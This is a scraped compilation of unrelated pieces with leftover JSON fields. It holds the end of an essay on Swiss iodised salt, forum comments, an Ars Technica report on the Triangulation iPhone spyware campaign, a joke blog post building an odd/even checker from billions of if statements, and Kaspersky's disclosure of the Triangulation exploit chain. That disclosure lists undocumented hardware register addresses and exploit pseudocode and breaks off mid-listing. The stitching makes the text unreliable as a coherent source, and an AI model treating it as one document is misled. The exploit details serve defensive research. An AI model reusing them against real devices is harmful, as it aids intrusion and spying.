convinced the salt was safe, canton by canton – a ‘Sisyphean task’, as Bayard later wrote. One man at the meeting was sure it could be done. Hans Eggenberger was the chief doctor at the hospital in Herisau, the tiny capital of the sparsely populated canton of Appenzell Ausserrhoden. Unlike Bayard, Eggenberger had no doubts about Hunziker’s theory. The previous May, he had proposed salt iodisation to the canton’s health authority, only to be told, in the recollection of his then assistant, that ‘the people will never, ever permit themselves to accept something like that.’ Then and now, Appenzellers are famed throughout Switzerland for resisting change, but Eggenberger took a different view of his fellow citizens. Returning to Herisau three days after the commission met, he announced an addition to the programme of light entertainment at the town cinema – a lecture on iodised salt. Perhaps it was curiosity, or the colour slides, or the reputation of the charismatic 40-year-old doctor, but the cinema was packed. Goitre was embarrassing, ugly and a subject for humour, so Eggenberger began his presentation with the image of the Madonna from Albrecht Dürer’s Dresden Altarpiece: unimpeachable, unmockable and exhibiting, he claimed, an obvious goitre. Speaking in the local Swiss-German dialect, he filled his talk with jokes and tugs on the emotions. He called iodised salt ‘whole salt’, in an echo of ‘whole milk’ and ‘wholemeal’, to make it sound natural and healthy. And he began a petition – a request that the cantonal government ‘take responsibility for the production of whole salt, support it financially and make it accessible to the public wherever salt is sold’. In Switzerland’s system of direct democracy, petitions have weight; in Appenzell Ausserrhoden, as in other cantons, authorities are constitutionally bound to review them and respond without delay. In pursuit of signatures, Eggenberger embarked on a breakneck tour of evening lectures, commandeering an ambulance to visit all fifteen communities in the canton in just three weeks. In five days alone, he gathered more than three thousand signatures. On 20 February, the cantonal government granted permission for production. Two days later, just one month after the Goitre Commission met, ‘whole salt’ went on sale in Appenzell Ausserrhoden. An entire canton had iodised salt: not by diktat, but by popular demand. In June, the Goitre Commission met again. Before it lay a report on the history of using iodine to treat goitre by Professor Fritz de Quervain, the country’s leading authority on thyroid disorders. De Quervain was unconvinced by Hunziker’s unproven theory and wary of Eggenberger’s propaganda. His mentor and predecessor at the Bern Inselspital, the Nobel prizewinner Theodor Kocher, had, before his death five years earlier, publicly insisted that goitre prophylaxis should be undertaken only once its mechanism of action was proven. Yet De Quervain’s report set out the case for iodised salt: he was ready to give iodine to an entire country, without understanding how it worked. It was not a calm meeting. There were accusations of poor scientific practice, and allegations of corruption. The men knew they were on the verge of a historic decision, one that might liberate the country, or kill innocent people and destroy trust in the medical profession. On 24 June, they formally recommended iodised salt to the cantons. Nothing like this had ever been done before, anywhere in the world: it was the first food fortification programme; the first attempt by a government to improve the lives of an entire population by adding a chemical to its food supply. In November 1922, the first batches were delivered. Within a year, iodised salt was on sale in seventeen cantons. By the end of the decade, it was available nationwide. And so – as in a fairy tale – the ‘national evil’ was banished from the land. By 1930, wherever the salt was used, goitre had all but disappeared. The rate of deaf-mute births fell fivefold in just eight years, from one in six hundred, to one in three thousand. Across the country, schools for deaf-mute children shut down. Since 1930, not a single baby has been born in Switzerland with congenital iodine deficiency syndrome. It was a sensation. ‘Switzerland – free of goitre!’ the front page of the Basler Nachrichten announced in February 1922, days after the first Goitre Commission. ‘Unless all the signs prove deceptive, Switzerland today stands at the gates of a goitre-free future.’ The syndicated piece praised Hunziker and Eggenberger ‘as benefactors of humanity and heralds of a new era of healthcare’. So why isn’t this story more familiar? Why has the achievement of these pioneers been forgotten, the evidence languishing in a dusty archive? On 20 July 1922, less than a month after the recommendation by the Goitre Commission, an unusually long leading article appeared in the Swiss Medical Weekly. It began: ‘If one looks through medical journals, political dailies, newspapers ... one might come to believe that, next to Einstein’s Theory of Relativity, the iodine treatment of goitre is the most important discovery of the last decades, and that ... a “goitreless” golden age has arrived.’ What followed was an astonishing attack on the Goitre Commission. Its author, Dr Eugen Bircher, son of Heinrich Bircher and his successor as chief surgeon at the cantonal hospital in Aarau, was a member of the commission, and had voted in favour of iodised salt. Yet now he raged against the ‘downright careless – not to say criminal – praise of iodine’. Insisting without any basis on the risk of the Jod-Basedow effect, Bircher failed to address the success of Bayard’s trial. One explanation for his vitriol is that in 1918, when Bayard began his experiments, Bircher launched Strumaval, an expensive, eight-day goitre treatment, which was still available when his article appeared but whose future seemed unsure. Bircher was an influential man in 1920s Switzerland. Tall and domineering, he was a senior figure in the army, and the founder, in 1919, of the Swiss Fatherland Association, a far-right militia with links to the government and fascist groups abroad. He was the subject of scandal in 1924, when he was alleged to have given funding to Hitler in the months of hyperinflation before the Munich Putsch (German intelligence services have a record of a meeting; Swiss intelligence services do not). Hunziker, Bayard and Eggenberger had no attachment to a university or institution, but Bircher became the editor of the Swiss Medical Weekly in 1926. During the 1930s and 1940s, he occupied an ever increasing number of senior positions in the Swiss industrial, political, medical and military establishment. His opposition to iodised salt was fixed and unchanging, long after its effects were essentially beyond dispute. Until his death in 1956, annual sales of iodised salt in Aargau, the fourth-largest canton, Bircher’s home and the centre of his power, amounted to less than 10 per cent of all salt sold there. In 1931, by which time goitre had virtually disappeared among Swiss young people, 95 per cent of the schoolchildren in Aarau still had swollen thyroids. By the time of Bircher’s death, three decades had elapsed since the headlines of 1922. A generation had died, taking with it the memory of the way life had been. In 1927, Bruno Galli-Valerio, a member of the Goitre Commission, in a speech in Valais, railed against the ‘absurd idea, sadly so widespread, that goitre and cretinism bring shame to a country, and that they must therefore be ignored’. Yet the shame and the silence were widespread. A year later, Eggenberger noted how ‘hastily people forget past plagues’. Eggenberger died in a climbing accident in 1946, Bayard of cancer in 1957. Hunziker outlived Switzerland’s last cretin, dying in 1982, at the age of 102. None of them could have achieved the breakthrough alone. Hunziker was a visionary, with a theory so compelling it could not be ignored; Bayard, the scientist, showed the salt would work for entire towns; Eggenberger was an activist, able to convince the cautious Swiss to embrace innovation. Yet they remain unknown, while other Swiss members of their generation are household names: Hermann Rorschach, of the inkblot test, was a colleague of Eggenberger’s in Herisau; Albert Einstein went to the same school as Eugen Bircher; Max Bircher-Benner (no relation) lives on through his muesli. Carl Jung documented the strange depression that struck his mother when the family moved to Laufen – a village that, as Heinrich Bircher’s survey shows, was badly afflicted by goitre. In 1990, Hans Bürgi, another enterprising Swiss medic, published a paper in English on the forgotten iodine pioneers. That year, iodised salt was used in less than 20 per cent of households worldwide, and a global campaign by the WHO and Unicef was set in motion. Today, iodised salt is used by more than 88 per cent of the world’s population. Internationally, it is regarded as one of the most successful public health measures ever devised. Yet in today’s prosperous and healthy Switzerland the tale seems more fantastical than ever: an evil vanquished so completely it has been all but forgotten.

Thanks for posting that.With all our popular narratives about the inevitability of scientific progress, it&#x27;s always refreshing (from a historical point of view) and important (from a personal, ethical perspective) to remember that there&#x27;s no guarantee that chronologically later developments will necessarily be improvements on earlier conclusions.It brings to mind our current replication crises in science. reply vladms 12 hours agorootparentDepends what you mean by \"development\", as the article does not describe developments on treating scurvy, but rather somehow random actions based on wrong assumptions (ex: limes are the same as lemons; acidity is all that matters).And even if in this case the initial solution was correct, it was still observing a correlation, as they had no clue why lemons do the job.My conclusion based on the article is that just experimenting is not enough, you also need to develop and test a complex understanding of the system. We probably don&#x27;t cherish enough as a society, that some of us (as in: trained researchers, etc.) have a mindset that expects both replication and understanding, even if being humans we don&#x27;t always reach this ideal. reply Kalium 12 hours agoparentprevIt&#x27;s worth noting the critical details: how to prevent scurvy was understood, but the underlying mechanisms were not.

    "originBody": "NO ORDINARY VULNERABILITY — 4-year campaign backdoored iPhones using possibly the most advanced exploit ever \"Triangulation\" infected dozens of iPhones belonging to employees of Moscow-based Kaspersky. Dan Goodin - 12/27/2023, 5:03 PM Enlarge Tero Vesalainen reader comments 110 Researchers on Wednesday presented intriguing new findings surrounding an attack that over four years backdoored dozens if not thousands of iPhones, many of which belonged to employees of Moscow-based security firm Kaspersky. Chief among the discoveries: the unknown attackers were able to achieve an unprecedented level of access by exploiting a vulnerability in an undocumented hardware feature that few if anyone outside of Apple and chip suppliers such as ARM Holdings knew of. “The exploit's sophistication and the feature's obscurity suggest the attackers had advanced technical capabilities,” Kaspersky researcher Boris Larin wrote in an email. “Our analysis hasn't revealed how they became aware of this feature, but we're exploring all possibilities, including accidental disclosure in past firmware or source code releases. They may also have stumbled upon it through hardware reverse engineering.” Four zero-days exploited for years Other questions remain unanswered, wrote Larin, even after about 12 months of intensive investigation. Besides how the attackers learned of the hardware feature, the researchers still don’t know what, precisely, its purpose is. Also unknown is if the feature is a native part of the iPhone or enabled by a third-party hardware component such as ARM’s CoreSight Further Reading “Clickless” iOS exploits infect Kaspersky iPhones with never-before-seen malware The mass backdooring campaign, which according to Russian officials also infected the iPhones of thousands of people working inside diplomatic missions and embassies in Russia, according to Russian government officials, came to light in June. Over a span of at least four years, Kaspersky said, the infections were delivered in iMessage texts that installed malware through a complex exploit chain without requiring the receiver to take any action. With that, the devices were infected with full-featured spyware that, among other things, transmitted microphone recordings, photos, geolocation, and other sensitive data to attacker-controlled servers. Although infections didn’t survive a reboot, the unknown attackers kept their campaign alive simply by sending devices a new malicious iMessage text shortly after devices were restarted. A fresh infusion of details disclosed Wednesday said that “Triangulation”—the name Kaspersky gave to both the malware and the campaign that installed it—exploited four critical zero-day vulnerabilities, meaning serious programming flaws that were known to the attackers before they were known to Apple. The company has since patched all four of the vulnerabilities, which are tracked as: Advertisement CVE-2023-32434 CVE-2023-32435 CVE-2023-38606 CVE-2023-41990 Besides affecting iPhones, these critical zero-days and the secret hardware function resided in Macs, iPods, iPads, Apple TVs, and Apple Watches. What’s more, the exploits Kaspersky recovered were intentionally developed to work on those devices as well. Apple has patched those platforms as well. Apple declined to comment for this article. Detecting infections is extremely challenging, even for people with advanced forensic expertise. For those who want to try, a list of Internet addresses, files, and other indicators of compromise is here. Mystery iPhone function proves pivotal to Triangulation’s success The most intriguing new detail is the targeting of the heretofore-unknown hardware feature, which proved to be pivotal to the Operation Triangulation campaign. A zero-day in the feature allowed the attackers to bypass advanced hardware-based memory protections designed to safeguard device system integrity even after an attacker gained the ability to tamper with memory of the underlying kernel. On most other platforms, once attackers successfully exploit a kernel vulnerability they have full control of the compromised system. On Apple devices equipped with these protections, such attackers are still unable to perform key post-exploitation techniques such as injecting malicious code into other processes, or modifying kernel code or sensitive kernel data. This powerful protection was bypassed by exploiting a vulnerability in the secret function. The protection, which has rarely been defeated in exploits found to date, is also present in Apple’s M1 and M2 CPUs. Kaspersky researchers learned of the secret hardware function only after months of extensive reverse engineering of devices that had been infected with Triangulation. In the course, the researchers' attention was drawn to what are known as hardware registers, which provide memory addresses for CPUs to interact with peripheral components such as USBs, memory controllers, and GPUs. MMIOs, short for Memory-mapped Input/Outputs, allow the CPU to write to the specific hardware register of a specific peripheral device. The researchers found that several of MMIO addresses the attackers used to bypass the memory protections weren’t identified in any so-called device tree, a machine-readable description of a particular set of hardware that can be helpful to reverse engineers. Even after the researchers further scoured source codes, kernel images, and firmware, they were still unable to find any mention of the MMIO addresses.

In his spare time, he enjoys gardening, cooking, and following the independent music scene. Advertisement Promoted Comments Jt21 Both options are likely and equally valid. Seeing how it was predominantly aimed at Russian based targets, and the vulnerabilities/features would have been at least known to Apple/ARM it's not unreasonable to assume that the NSA was behind this either at the root introducing it, or later on just exploiting it. It's not even unexpected given that this is how the spying game works and the NSA was already known to impose such vulnerabilities on everyone else in the world for decades. It didn't target Russians. It targeted foreign embassies in Russia. My bet would be FSB or Chinese intelligence. Who's more likely to want to spy on NATO embassy personnel, the NSA or FSB? December 27, 2023 at 6:34 pm SeanJW What I don't understand, and maybe someone can explain, is why iMessages or SMS messages are allowed to do anything without user interaction. It has the aroma of Outlook opening email attachments indiscriminately or Microsoft Office automatically running macros and VBScripts embedded in documents. This stuff should have been ganz streng verboten more than two decades ago. Why does it still exist? Every program does things without interaction required every day. You opened a program? Boom, it’s doing what’s necessary to show you the opening screen. In this case, that’s what iMessage is doing - it’s rendering the messages, which includes the fonts, which triggers a CVE that’s now fixed. Edit: that can include previewing them in a notification, or otherwise just downloading them and storing them. All things you expect to happen.

    "originLink": "https://andreasjhkarlsson.github.io//jekyll/update/2023/12/27/4-billion-if-statements.html",
    "originBody": "4 billion if statements Dec 27, 2023 I recently stumbled upon this screenshot while researching social media on the train. Of course, it was followed by a cascade of spiteful comments, criticizing this fresh programmer’s attempt to solve a classical problem in computer science. The modulus operation. Now, in a world where AI is replacing programmers by the minute, taking their jobs and revolutionizing the way we think about code, maybe we should be more open to the thoughts of the fresh new blood of the industry? In fact, the above code is a perfect example of a time-memory tradeoff. You’re trading off your time and at the same time, the computers memory and time as well! Truly a marvelous algorithm! So I went to work to explore this idea of checking if a number is odd or even by only using comparisons to see how well it works in a real world scenario. Since I’m a great believer in performant code I decided to implement this in the C programming language as it’s by far the fastest language on the planet to this day (thanks to the visionary genius Dennis Richie). So I started composing /* Copyright 2023. All unauthorized distribution of this source code will be persecuted to the fullest extent of the law*/ #include#include#includeint main(int argc, char* argv[]) { uint8_t number = atoi(argv[1]); // No problems here if (number == 0) printf(\"even\"); if (number == 1) printf(\"odd\"); if (number == 2) printf(\"even\"); if (number == 3) printf(\"odd\"); if (number == 4) printf(\"even\"); if (number == 5) printf(\"odd\"); if (number == 6) printf(\"even\"); if (number == 7) printf(\"odd\"); if (number == 8) printf(\"even\"); if (number == 9) printf(\"odd\"); if (number == 10) printf(\"even\"); } Beautiful! Lets compile the code, disabling optimizations with /Od to make sure that the pesky compiler doesn’t interfere with our algorithm. After compiling we can do a quick test of the program we get some positive results: PS > cl.exe /Od program.c PS > .\\program.exe 0 even PS > .\\program.exe 4 even PS > .\\program.exe 3 odd PS > .\\program.exe 7 odd However, after doing some further testing I found some problems: PS > .\\program.exe 50 PS > .\\program.exe 11 PS > .\\program.exe 99 No output! It seems that the program only works for numbers under 11! Going back to the code we can find the issue right after the last if statement, we need more if statements! Now, this is a time-memory tradeoff, but my time on this earth is limited so I decided to meta-program the if statements using a programmer program in a different programming language. To compensate for this cheating I decided to use the slowest language on the planet, Python (thanks to the visionary genius of Ross van der Gussom). print(\"/* Copyright 2023. All unauthorized distribution of this source code\") print(\" will be persecuted to the fullest extent of the law*/\") print(\"#include \") print(\"#include \") print(\"#include \") print(\"int main(int argc, char* argv[])\") print(\"{\") print(\" uint8_t number = atoi(argv[1]); // No problems here\") for i in range(2**8): print(\" if (number == \"+str(i)+\")\") if i % 2 == 0: print(\" printf(\\\"even\\\\\");\") else: print(\" printf(\\\"odd\\\\\");\") print(\"}\") Nice! Now we can generate a program that solves the even-odd problem for all 8-bit integers! PS > python programmer.py > program.c PS > cl.exe /Od program.c PS > .\\program.exe 99 odd PS > .\\program.exe 50 even PS > .\\program.exe 240 even PS > .\\program.exe 241 odd Would you look at that! It works flawlessly! Now, let’s scale it up to 16 bit! print(\" uint16_t number = atoi(argv[1]); // No problems here\") … for i in range(2**16): This gives a nice and thick c file of around 130k lines. Nothing really when looking back at some of the code bases I’ve worked on over the years. Let’s compile! PS > python programmer.py > program.c PS > cl.exe /Od program.c PS > .\\program.exe 21000 even PS > .\\program.exe 3475 odd PS > .\\program.exe 3 odd PS > .\\program.exe 65001 odd PS > .\\program.exe 65532 even Beautiful! Our algorithm seems to scale with the data! The executable is around 2 MB, but that’s no match for my beefy gaming rig with a whopping 31.8 GB of memory. Now, 16 bit is a very cool bitwidth, but as we all know, 32 bit is the holy grail of computing and is the final bitwidth that we need to solve all practical engineering and scientific problems. After all, IPv4 is still standing stronger than ever, 60 years after it was deemed deprecated due to so called “address exhaustion”. So without further ado, lets scale to our final size. 32 bit is only 65536 times as many numbers as 16 bit, what could go wrong? print(\" uint32_t number = atoi(argv[1]); // No problems here\") … for i in range(2**32): So I let the mighty snake do its work and after getting a cup of coffee and getting back to check on the program 48 hours later I was left with a beautiful c file, almost 330 GB in size! Almost certainly among the largest c files in history. My fingers were trembling when I entered the next command, surely MSVC had never before encountered such powerful source code. After abusing the pagefile of my poor, powerful computer for half an hour the following was spat out: PS > cl /Od program.c Microsoft (R) C/C++ Optimizing Compiler Version 19.32.31329 for x64 Copyright (C) Microsoft Corporation. All rights reserved. program.c program.c(134397076): warning C4049: compiler limit: terminating line number emission program.c(134397076): note: Compiler limit for line number is 16777215 program.c(41133672): fatal error C1060: compiler is out of heap space Pathetic! And not only did the compiler fail us, but when looking into the limits of the Portable Executable format (.exe) for windows, I discovered that it cannot handle more than a measly 4 GB! With more than 4 billion comparisons needed to be encoded into the executable, this is a major obstacle for implementing our algorithm. Even if each comparison would use less than a single byte we would still be too heavy. However, bad compilers and file formats should not stop us from achieving our dream. After all, all what a compiler does is writing some fancy machine code into a file and the file format is just some structure telling the OS how to put the binary code into memory. Really, we can do that ourselves. Let’s start by writing an IsEven function in x86-64 assembly as it’s the native language of my Intel powered machine. It looks something like this: ; Argument is stored in ECX, return value in EAX XOR EAX, EAX ; Set eax to zero (return value for odd number) CMP ECX, 0h ; Compare arg to 0 JNE 3h ; Skip next two instructions if it wasn't equal INC EAX ; It was even, set even return value (1) RET ; Return CMP ECX, 1h ; Compare arg to 1 JNE 2 ; Skip next instruction if not equal RET ; Odd return value already in EAX, just RET ; add the next 2...2^32-1 comparisons here RET ; Fallback return Not really correct asm, but it doesn’t matter much, because we’re gonna compile it into machine code manually. How did I do this? Well I jumped online, using a mix of my early life experience coding emulators and hacking and looked into the x86(-64) architecture manuals to figure out the correct opcodes and format for each instruction. … Just kidding, that’s horrible. I asked ChatGPT what the correct opcode was for each instruction and lucky for us it didn’t hallucinate any new extensions to x86-64. So now we just write a “compiler” to output this code. Note that we will write the opcodes we got from the AI for the instructions directly. Here’s how it looks in our friend python: import struct with open('isEven.bin', 'wb') as file: file.write(b\"\\x31\\xC0\") # XOR EAX, EAX for i in range(2**32): ib = struct.pack(\" #include#includeint main(int argc, char* argv[]) { uint32_t number = atoi(argv[1]); // No problems here // Open code file HANDLE binFile = CreateFileA( \"isEven.bin\", GENERIC_READGENERIC_EXECUTE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); // Get 64 bit size of file LARGE_INTEGER codeSize; GetFileSizeEx(binFile, &codeSize); // Create memory map of the file HANDLE mapping = CreateFileMapping( binFile, NULL, PAGE_EXECUTE_READ, 0, 0, NULL); // Get a pointer to the code LPVOID code = MapViewOfFile( mapping,FILE_MAP_EXECUTEFILE_MAP_READ, 0, 0, codeSize.QuadPart); // Create a function that points to the code int (*isEven)(int) = (int(*)(int))code; if (isEven(number)) printf(\"even\"); else printf(\"odd\"); CloseHandle(binFile); } And there we go! We now have everything to check if any 32 bit number is even or odd. Let’s take it for a spin: PS >.\\program.exe 300 even PS >.\\program.exe 0 even PS >.\\program.exe 1000000 even PS >.\\program.exe 100000007 odd PS >.\\program.exe 400000000 even PS >.\\program.exe 400000001 odd PS >.\\program.exe 400000006 even PS >.\\program.exe 4200000000 odd .\\program.exe 4200000000 even PS >.\\program.exe 4200000001 odd As a side note, the program is amazingly performant. For small numbers the results are instantaneous and for the large number close to the 2^32 limit the result is still returned in around 10 seconds. Considering the computer has to read 40 GB of data from disk, map it to physical memory and then let the CPU has a rip of it without many chances of caching is honestly quite mind blowing. For reference, the computer is a Core i5 12600K with 32 GB memory and the files are residing on a M.2 SSD disk. While calculating, the peak read speed I saw from the SSD was around 800 MB/s (which doesn’t really make sense as that should give execution speeds at 40+ seconds, but computers are magical so who knows what is going on). And there we have it! The Internet proven wrong once again, not only can you actually write a fully functioning and performant program in the manner of the TikTok post, but it’s also very fun.",

If you can&#x27;t use that or if it doesn&#x27;t work you can easily create an ELF object file that contains a data section with that number repeated 2 billion times.Explaination:That magic number is actually two 32-bit numbers juxtaposed:The first one is 0xC340C033, which encodes the following instructions: xor eax, eax ; 33 C0 inc eax ; 40 ret ; C3This effectively returns 1 in the eax register (which is compatible with the C calling convention)The second number is similar but it doesn&#x27;t include the \"inc\" instruction.When casting as a int array we end up with an array with alternating function bodies. At even positions we have functions that return 1 (true) and at odd positions it returns 0 (false)The interesting thing is each of those function bodies fit into a 32-bit number.

It&#x27;s controlled by an ESP32 (running ESPHome). I started generating little animations for different times of year (in the form of ESPHome light effects). I ran into a few problems:- The edit&#x2F;compile&#x2F;flash&#x2F;debug cycle was painfully slow.- Expressing the animations in C++ sapped inspiration.- Some parts of the animations are more computationally intensive than others, so getting consistent \"frame rates\" was difficult.That \"frame rates\" bit made me realize these are just little videos with 150x1 pixel resolution. Now I write the animations in Python on my laptop and that code has two backends. One renders to the screen for quick iteration on the animations. The other plays one cycle through the loop of each animation and emits the results as C++ arrays and some variables (e.g., name, desired frame rate, etc.). Then the only other C++ code needed is the logic for passing the array data to the LED library.There is no compression or anything else fancy. I can fit about a dozen animations with 100 to 200 frames each on a $4 microcontroller with Wi-Fi. They start almost instantly when applying power, and they play at a very consistent frame rate.

In theory they aren’t complete, but in practice they are. Wonder if there’s a theorem which links the maths with physics in an intuitive way. Thermodynamics sort of do, but entropy isn’t that intuitive? reply Joker_vD 15 minutes agorootparentYou can have e.g. Python (lists and bignums) implementation that would acquire more and more storage as needed: first from the RAM, then from disk, then doing fancy cloud Memory-as-a-Service requests, then commissioning building more datacenters, then branching out to the other planets etc. until it runs into the finiteness of the universe, all the while providing the abstraction of lists and numbers that can grow without hard limit (although with growing access latency). The practical limit is determined entirely by the things extraneous to the computation model itself.On the other hand, if you have e.g. C, then your program is in principle can not have an array with indices larger than SIZE_MAX, period — which is guaranteed to be a finite number. This limit is built into the C abstract machine. Trying to weasel out of it by using FILE I&#x2F;O is hindered by the fact that ftell() has to return accurate results that must fit into long (now, if ftell() were unavailable, or were allowed to fail for large enough offsets, then fseek()&#x2F;read()&#x2F;write() could actually be used in an obvious way for simulating a tape without a hard limit on its size). So this computation model, while practically Turing-complete, is not theoretically Turing-complete.So, my original point was that built-in support for arrays, while providing ergonomics and performance, does not really extend the computational capabilities of the language: the languages with finite-sized integers but without arrays can simulate finite-sized arrays just like so. And if your integers are unbounded then you can use e.g. Gödel numbering to simulate unbounded arrays (again, with loss in ergonomics and performance). replyRetr0id 1 hour agoprev> for the large number close to the 2^32 limit the result is still returned in around 10 seconds.This could be improved by arranging the if&#x2F;else statements in a binary tree. reply hansjorg 1 hour agoparentCome to think of it, I&#x27;m sure there are other optimisations you could do as well. reply Scarblac 56 minutes agoparentprevIt could also simply check the most common numbers first.

    "originBody": "Research Operation Triangulation: The last (hardware) mystery Research 27 Dec 2023 17 minute read Table of Contents Operation Triangulation’ attack chain The mystery and the CVE-2023-38606 vulnerability Technical details Conclusion Authors Boris Larin Today, on December 27, 2023, we (Boris Larin, Leonid Bezvershenko, and Georgy Kucherin) delivered a presentation, titled, “Operation Triangulation: What You Get When Attack iPhones of Researchers”, at the 37th Chaos Communication Congress (37C3), held at Congress Center Hamburg. The presentation summarized the results of our long-term research into Operation Triangulation, conducted with our colleagues, Igor Kuznetsov, Valentin Pashkov, and Mikhail Vinogradov. This presentation was also the first time we had publicly disclosed the details of all exploits and vulnerabilities that were used in the attack. We discover and analyze new exploits and attacks using these on a daily basis, and we have discovered and reported more than thirty in-the-wild zero-days in Adobe, Apple, Google, and Microsoft products, but this is definitely the most sophisticated attack chain we have ever seen. Operation Triangulation’ attack chain Here is a quick rundown of this 0-click iMessage attack, which used four zero-days and was designed to work on iOS versions up to iOS 16.2. Attackers send a malicious iMessage attachment, which the application processes without showing any signs to the user. This attachment exploits the remote code execution vulnerability CVE-2023-41990 in the undocumented, Apple-only ADJUST TrueType font instruction. This instruction had existed since the early nineties before a patch removed it. It uses return/jump oriented programming and multiple stages written in the NSExpression/NSPredicate query language, patching the JavaScriptCore library environment to execute a privilege escalation exploit written in JavaScript. This JavaScript exploit is obfuscated to make it completely unreadable and to minimize its size. Still, it has around 11,000 lines of code, which are mainly dedicated to JavaScriptCore and kernel memory parsing and manipulation. It exploits the JavaScriptCore debugging feature DollarVM ($vm) to gain the ability to manipulate JavaScriptCore’s memory from the script and execute native API functions. It was designed to support both old and new iPhones and included a Pointer Authentication Code (PAC) bypass for exploitation of recent models. It uses the integer overflow vulnerability CVE-2023-32434 in XNU’s memory mapping syscalls (mach_make_memory_entry and vm_map) to obtain read/write access to the entire physical memory of the device at user level. It uses hardware memory-mapped I/O (MMIO) registers to bypass the Page Protection Layer (PPL). This was mitigated as CVE-2023-38606. After exploiting all the vulnerabilities, the JavaScript exploit can do whatever it wants to the device including running spyware, but the attackers chose to: (a) launch the IMAgent process and inject a payload that clears the exploitation artefacts from the device; (b) run a Safari process in invisible mode and forward it to a web page with the next stage. The web page has a script that verifies the victim and, if the checks pass, receives the next stage: the Safari exploit. The Safari exploit uses CVE-2023-32435 to execute a shellcode. The shellcode executes another kernel exploit in the form of a Mach object file. It uses the same vulnerabilities: CVE-2023-32434 and CVE-2023-38606. It is also massive in terms of size and functionality, but completely different from the kernel exploit written in JavaScript. Certain parts related to exploitation of the above-mentioned vulnerabilities are all that the two share. Still, most of its code is also dedicated to parsing and manipulation of the kernel memory. It contains various post-exploitation utilities, which are mostly unused. The exploit obtains root privileges and proceeds to execute other stages, which load spyware. We covered these stages in our previous posts. We are almost done reverse-engineering every aspect of this attack chain, and we will be releasing a series of articles next year detailing each vulnerability and how it was exploited. However, there are certain aspects to one particular vulnerability that we have not been able to fully understand. The mystery and the CVE-2023-38606 vulnerability What we want to discuss is related to the vulnerability that has been mitigated as CVE-2023-38606. Recent iPhone models have additional hardware-based security protection for sensitive regions of the kernel memory. This protection prevents attackers from obtaining full control over the device if they can read and write kernel memory, as achieved in this attack by exploiting CVE-2023-32434. We discovered that to bypass this hardware-based security protection, the attackers used another hardware feature of Apple-designed SoCs. If we try to describe this feature and how the attackers took advantage of it, it all comes down to this: they are able to write data to a certain physical address while bypassing the hardware-based memory protection by writing the data, destination address, and data hash to unknown hardware registers of the chip unused by the firmware. Our guess is that this unknown hardware feature was most likely intended to be used for debugging or testing purposes by Apple engineers or the factory, or that it was included by mistake. Because this feature is not used by the firmware, we have no idea how attackers would know how to use it. We are publishing the technical details, so that other iOS security researchers can confirm our findings and come up with possible explanations of how the attackers learned about this hardware feature. Technical details Various peripheral devices available in the SoC may provide special hardware registers that can be used by the CPU to operate these devices. For this to work, these hardware registers are mapped to the memory accessible by the CPU and are known as “memory-mapped I/O (MMIO)“. Address ranges for MMIOs of peripheral devices in Apple products (iPhones, Macs, and others) are stored in a special file format: DeviceTree. Device tree files can be extracted from the firmware, and their contents can be viewed with the help of the dt utility. Example of how MMIO ranges are stored in the device tree For example, in this screenshot, you can see the start (0x210f00000) and the size (0x50000) of the acc-impl MMIO range for cpu0. While analyzing the exploit used in the Operation Triangulation attack, I discovered that most of the MMIOs used by the attackers to bypass the hardware-based kernel memory protection do not belong to any MMIO ranges defined in the device tree. The exploit targets Apple A12–A16 Bionic SoCs, targeting unknown MMIO blocks of registers that are located at the following addresses: 0x206040000, 0x206140000, and 0x206150000. The prompted me to try something. I checked different device tree files for different devices and different firmware files: no luck. I checked publicly available source code: no luck. I checked the kernel images, kernel extensions, iboot, and coprocessor firmware in search of a direct reference to these addresses: nothing. How could it be that that the exploit used MMIOs that were not used by the firmware? How did the attackers find out about them? What peripheral device(s) do these MMIO addresses belong to? It occurred to me that I should check what other known MMIOs were located in the area close to these unknown MMIO blocks. That approach was successful. Let us take a look at a dump of the device tree entry for gfx-asc, which is the GPU coprocessor. Dump of the device tree entry for gfx-asc It has two MMIO ranges: 0x206400000–0x20646C000 and 0x206050000–0x206050008. Let us take a look at how they correlate with the regions used by the exploit. Correlation of the gfx-asc MMIO ranges and the addresses used by the exploit To be more precise, the exploit uses the following unknown addresses: 0x206040000, 0x206140008, 0x206140108, 0x206150020, 0x206150040, and 0x206150048. We can see that most of these are located in the area between the two gfx-asc regions, and the remaining one is located close to the beginning of the first gfx-asc region. This suggested that all these MMIO registers most likely belonged to the GPU coprocessor! After that, I took a closer look at the exploit and found one more thing that confirmed my theory. The first thing the exploit does during initialization is writing to some other MMIO register, which is located at a different address for each SoC. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 if (cpuid == 0x8765EDEA): # CPUFAMILY_ARM_EVEREST_SAWTOOTH (A16) base = 0x23B700408 command = 0x1F0023FF elif (cpuid == 0xDA33D83D): # CPUFAMILY_ARM_AVALANCHE_BLIZZARD (A15) base = 0x23B7003C8 command = 0x1F0023FF elif (cpuid == 0x1B588BB3): # CPUFAMILY_ARM_FIRESTORM_ICESTORM (A14) base = 0x23B7003D0 command = 0x1F0023FF elif (cpuid == 0x462504D2): # CPUFAMILY_ARM_LIGHTNING_THUNDER (A13) base = 0x23B080390 command = 0x1F0003FF elif (cpuid == 0x07D34B9F): # CPUFAMILY_ARM_VORTEX_TEMPEST (A12) base = 0x23B080388 command = 0x1F0003FF if ((~read_dword(base) & 0xF) != 0): write_dword(base, command) while(True): if ((~read_dword(base) & 0xF) == 0): break Pseudocode for the GFX power manager control code from the exploit With the help of the device tree and Siguza’s utility, pmgr, I was able to discover that all these addresses corresponded to the GFX register in the power manager MMIO range. Finally, I obtained a third confirmation when I decided to try and access the registers located in these unknown regions. Almost instantly, the GPU coprocessor panicked with a message of, “GFX SERROR Exception class=0x2f (SError interrupt), IL=1, iss=0 – power(1)”. This way, I was able to confirm that all these unknown MMIO registers used for the exploitation belonged to the GPU coprocessor. This motivated me to take a deeper look at its firmware, which is also written in ARM and unencrypted, but I could not find anything related to these registers in there. I decided to take a closer look at how the exploit operated these unknown MMIO registers. The register 0x206040000 stands out from all the others because it is located in a separate MMIO block from all the other registers. It is touched only during the initialization and finalization stages of the exploit: it is the first register to be set during initialization and the last one, during finalization. From my experience, it was clear that the register either enabled/disabled the hardware feature used by the exploit or controlled interrupts. I started to follow the interrupt route, and fairly soon, I was able to recognize this unknown register, 0x206040000, and also discovered what exactly was mapped to the address range of 0x206000000–0x206050000. Below, you can see the reverse-engineered code of the exploit that I was able to recognize. I have given it a proper name. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 